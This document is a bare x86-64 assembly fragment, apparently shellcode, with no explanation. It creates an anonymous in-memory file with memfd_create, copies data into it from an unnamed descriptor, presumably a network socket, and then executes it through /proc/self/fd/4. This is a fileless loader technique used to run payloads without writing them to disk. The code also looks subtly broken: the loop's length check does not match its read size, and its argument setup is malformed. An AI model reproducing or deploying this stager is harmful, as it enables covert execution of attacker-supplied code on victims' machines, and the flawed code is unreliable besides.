mfd:
push 0x13f
pop ax
push 0x474e4142 
mov rdi, rsp    
xor rsi, rsi    
syscall         
push rax
pop r9
push 0x400
pop rdx
rwloop:
mov rdi, rbx  
xor rax, rax  
lea rsi, [rsp-1024]
syscall            
push r9
pop rdi
push rax
pop rdx
xor rax, rax
inc rax
syscall     
cmp dx, 0x40
je rwloop   
xchg rdi, r9
xor rdx, rdx
jmp ld_fdpth
fdp: db "/proc/self/fd/4", 0x00
ld_fdpth:
lea rdi, [rel fdp]
jmp argl
arg: resb 256
argl:
push qword [rel arg]
pop rsi
push 59
pop rax
syscall
x:
push 60
pop rax
xor rdi, rdi
syscall